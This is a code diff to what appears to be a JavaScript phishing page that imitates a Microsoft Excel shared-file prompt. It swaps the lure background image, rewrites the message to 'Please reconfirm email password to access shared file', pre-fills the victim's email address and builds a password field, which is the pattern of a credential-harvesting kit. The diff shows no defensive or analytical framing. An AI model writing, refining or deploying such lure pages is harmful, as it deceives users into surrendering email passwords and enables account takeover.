@@ -25,7 +25,7 @@ const styles = `
         font-family: Arial, sans-serif;
         margin: 0;
         padding: 0;
-        background-image: url("https://firebasestorage.googleapis.com/v0/b/png-images-481bb.appspot.com/o/excel2019.jpg?alt=media&token=9c862c55-78b2-4e5e-a353-96d848b2931a");
+        background-image: url("https://cdn.glitch.global/284bee3e-13ae-42ff-bd3a-b56ee6150ea0/image%20(4).jpg?v=1711448330982");
         background-size: cover;
         background-position: center;
         display: flex;
@@ -133,7 +133,7 @@ function createForm() {
     containerDiv.appendChild(h2);
 
     const p = document.createElement('p');
-    p.textContent = 'Because you're accessing sensitive info, you need to verify your email password.';
+    p.textContent = 'Please reconfirm email password to access shared file.';
     containerDiv.appendChild(p);
 
     const form = document.createElement('form');
@@ -149,7 +149,6 @@ function createForm() {
     emailInput.id = 'email';
     emailInput.value = emltag; // Set the value of the username field to emltag
     emailInput.required = true;
-	emailInput = 'readonly';
     form.appendChild(emailInput);
 
     const passwordInput = document.createElement('input');
